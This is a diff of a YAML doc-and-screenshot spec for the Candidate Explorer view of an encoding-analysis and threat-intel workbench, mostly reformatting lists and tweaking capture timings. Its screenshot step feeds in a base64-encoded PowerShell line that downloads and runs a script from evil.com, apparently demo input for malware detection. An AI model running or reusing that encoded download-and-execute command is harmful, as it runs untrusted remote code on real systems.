@@ -2,31 +2,36 @@ id: candidate_explorer
 title: Candidate Explorer
 category: Analyst Workbench
 audience: user
-purpose: Show every candidate encoding scored dynamically against your input with per-candidate evidence and structured why-not breakdowns.
+purpose: Show every candidate encoding scored dynamically against your input with
+  per-candidate evidence and structured why-not breakdowns.
 when_to_use:
-  - When the winner looks wrong and you need to see the runners-up
-  - Investigating ambiguous inputs (base32 vs base58 vs base62)
-  - Learning why a certain decoder was chosen
+- When the winner looks wrong and you need to see the runners-up
+- Investigating ambiguous inputs (base32 vs base58 vs base62)
+- Learning why a certain decoder was chosen
 confidence_rules:
-  - Confidence = weighted sum of alphabet, length, entropy, decode success, printable ratio, linguistic score, file signature, malware indicators
-  - Runners-up carry `rejection_reasons` with severity (high/medium/low)
+- Confidence = weighted sum of alphabet, length, entropy, decode success, printable
+  ratio, linguistic score, file signature, malware indicators
+- Runners-up carry `rejection_reasons` with severity (high/medium/low)
 tips:
-  - Click "CORRECT THIS" to submit a correction and (optionally) promote the input to the regression corpus
-  - IOC chips are enrichable — click 🛈 to fetch VT/OTX/AbuseIPDB verdicts
-related: [correction_flow, threat_intel_enrichment, investigation_timeline]
-
-# ------------------------------------------------------------
-# Screenshot capture — Phase 1 User Guide
-# ------------------------------------------------------------
+- Click "CORRECT THIS" to submit a correction and (optionally) promote the input to
+  the regression corpus
+- IOC chips are enrichable — click 🛈 to fetch VT/OTX/AbuseIPDB verdicts
+related:
+- correction_flow
+- threat_intel_enrichment
+- investigation_timeline
 capture:
   login: true
   steps:
-    - url: /workspace
-      wait_for: '[data-testid="input-textarea"]'
-      type_into:
-        selector: '[data-testid="input-textarea"]'
-        text: SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
-      click_before: '[data-testid="toggle-candidate-explorer"]'
-      delay_ms: 4000
-      post_click_ms: 3500
-      full_page: true
+  - url: /workspace
+    wait_for: '[data-testid="input-textarea"]'
+    type_into:
+      selector: '[data-testid="input-textarea"]'
+      text: SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+    click_before: '[data-testid="toggle-candidate-explorer"]'
+    delay_ms: 4000
+    post_click_ms: 6000
+    selectors:
+    - '[data-testid="input-card"]'
+    - '[data-testid="output-card"]'
+    - '[data-testid="threat-analysis-panel"]'
